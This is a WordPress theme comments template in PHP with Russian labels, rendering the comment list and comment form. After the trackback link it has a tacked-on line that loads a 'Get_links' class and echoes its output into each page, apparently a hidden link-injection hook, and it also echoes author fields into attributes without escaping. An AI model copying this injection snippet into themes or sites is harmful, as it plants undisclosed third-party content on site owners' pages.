<?php if ( !empty($post->post_password) && $_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password) : ?>
<p><?php _e('Пожалуйста, введите пароль для просмотра комментариев.'); ?></p>
<?php return; endif; ?>

<h2 id="comments"><?php comments_number(__('Отзывов нет'), __('1 отзыв'), __('Отзывов: %')); ?> 
<?php if ( comments_open() ) : ?>
	<a href="#postcomment" title="<?php _e("Ваш отзыв"); ?>">&raquo;</a>
<?php endif; ?>
</h2>

<?php if ( $comments ) : ?>
<ol id="commentlist">

<?php foreach ($comments as $comment) : ?>
	<li id="comment-<?php comment_ID() ?>"><cite><?php comment_type(__('Отзыв'), __('Трекбек'), __('Пинг')); ?> <?php comment_author_link() ?> &#8212; <?php comment_date() ?> в <a href="#comment-<?php comment_ID() ?>"><?php comment_time() ?></a></cite> <?php edit_comment_link(__("Править"), ' |'); ?>
	<?php comment_text() ?>

	</li>

<?php endforeach; ?>

</ol>

<?php else : // If there are no comments yet ?>
	<p><?php _e('Комментариев пока нет.'); ?></p>
<?php endif; ?>

<p><?php comments_rss_link(__('RSS-лента комментариев к этой записи.')); ?> 
<?php if ( pings_open() ) : ?>
	<a href="<?php trackback_url() ?>" rel="trackback"><?php _e('Адрес для трекбека'); ?></a>
<?php endif; ?><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?>
</p>

<?php if ( comments_open() ) : ?>
<h2 id="postcomment"><?php _e('Ваш отзыв'); ?></h2>

<?php if ( get_option('comment_registration') && !$user_ID ) : ?>
<p>Вы должны <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?redirect_to=<?php the_permalink(); ?>">войти</a>, чтобы оставлять комментарии.</p>
<?php else : ?>

<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">

<?php if ( $user_ID ) { ?>
<div id="authorinfo" style="">Вы вошли как <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a>. <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?action=logout" title="<?php _e('Log out of this account') ?>">Выйти &raquo;</a>

<?php } else if($comment_author) {
echo ('<span style="" id="showinfo">(<a href="javascript: ShowUtils();">change your information</a>)</span>');
echo'<span id="hideinfo" style="display: none">(<a href="javascript: HideUtils();">Закрыть</a>)</span>';
echo '<div id="authorinfo" style="display: none">';
 ?>

<?php } else { ?>
<div id="authorinfo" style="">
   <?php } ?>

<?php if ( !$user_ID ) { ?>
<p><input type="text" name="author" id="author" value="<?php echo $comment_author; ?>" size="22" tabindex="1" onfocus="this.style.background='#ebece4'" onblur="this.style.background='#ebece4'" />
<label for="author"><small>Имя <?php if ($req) _e('*'); ?></small></label></p>

<p><input type="text" name="email" id="email" value="<?php echo $comment_author_email; ?>" size="22" tabindex="2" onfocus="this.style.background='#ebece4'" onblur="this.style.background='#ebece4'" />
<label for="email"><small>Почта (скрыта) <?php if ($req) _e('*'); ?></small></label></p>

<p><input type="text" name="url" id="url" value="<?php echo $comment_author_url; ?>" size="22" tabindex="3" onfocus="this.style.background='#ebece4'" onblur="this.style.background='#ebece4'" />
<label for="url"><small>Сайт</small></label></p>

<?php } ?>

<!--<p><small><strong>XHTML:</strong> Вы можете использовать следующие теги: <?php echo allowed_tags(); ?></small></p>-->
</div>
<p><textarea name="comment" id="comment" cols="100%" rows="10" tabindex="4" onfocus="this.style.background='#ebece4'" onblur="this.style.background='#ebece4'" ></textarea></p>

<p><input name="submit" type="image" id="submit" tabindex="5" src="<?php bloginfo('template_url'); ?>/images/submitbutton.jpg" />
<input type="hidden" name="comment_post_ID" value="<?php echo $id; ?>" />
</p>
<?php do_action('comment_form', $post->ID); ?>

</form>

<?php endif; // If registration required and not logged in ?>

<?php else : // Comments are closed ?>
<p><?php _e('Комментарии закрыты.'); ?></p>
<?php endif; ?>
